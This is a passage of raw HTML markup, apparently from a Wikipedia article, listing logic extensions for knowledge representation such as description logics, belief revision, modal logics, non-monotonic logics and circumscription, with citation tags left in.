id="cite_note-395"><span </a>, <a href="/wiki/Non-monotonic_logic" title="Non-monotonic logic">non-monotonic logics </a> and <a href="/wiki/Circumscription_(logic)" title="Circumscription (logic)">circumscription </a><sup Several extensions of logic have been designed to handle specific domains of <a href="/wiki/Knowledge_representation" class="mw-redirect" title="Knowledge representation">knowledge </a>, such as: <a href="/wiki/Description_logic" title="Description logic">description logics </a>;<sup id="cite_ref-Representing_categories_and_relations_93-1" class="reference"><a href="#cite_note-Representing_categories_and_relations-93">&#91;90&#93; </a> </sup> <a href="/wiki/Belief_revision" title="Belief revision">belief calculus (belief revision) </a>;<sup id="cite_ref-203" class="reference"><a href="#cite_note-203">&#91;198&#93; </a> </sup> and <a href="/wiki/Modal_logic" title="Modal logic">modal logics </a>.<sup id="cite_ref-Representing_knowledge_about_knowledge_96-1" class="reference"><a href="#cite_note-Representing_knowledge_about_knowledge-96">&#91;93&#93;
